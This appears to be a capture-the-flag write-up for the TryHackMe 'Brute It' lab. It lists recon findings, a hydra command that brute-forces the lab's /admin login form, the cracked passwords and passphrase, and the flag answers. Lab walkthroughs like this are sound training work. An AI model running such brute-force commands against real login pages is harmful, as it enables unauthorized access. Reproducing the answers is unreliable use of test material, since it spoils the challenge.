# Brute It

machine ip : `10.10.183.34`



## Deploy the machine


| Questions | Answers |
|-----------|---------|
|

## Reconnaissance


| Questions | Answers |
|-----------|---------|
| How many ports are open ? | 2 |
| What version of SSH is running ? | OpenSSH 7.6p1 |
| Which Linux version of Apache is running ? | 2.4.29 |
| Whcih Linux distribution is running ? | ubuntu |
| What is the hidden directory ? | /admin |

## Getting a shell

bruteforcing the admin panel with hydra
```
hydra 10.10.183.34 -l admin -P rock.txt  http-post-form "/admin/:user=^USER^&pass=^PASS^:F=invalid"
```
> [80][http-post-form] host: 10.10.183.34   login: admin   password: xavier



| Questions | Answers |
|-----------|---------|
| What is the user:password of the admin panel ? | admin:xavier |
| What is John's RSA Private Key passphrase ? | rockinroll |
| user.txt | THM{a_password_is_not_a_barrier} |
| web flag | THM{brut3_f0rce_is_e4sy} |

## Privilege Escalation


| Questions | Answers |
|-----------|---------|
| What is the root's password ? | football |
| root.txt | THM{pr1v1l3g3_3sc4l4t10n}
 |
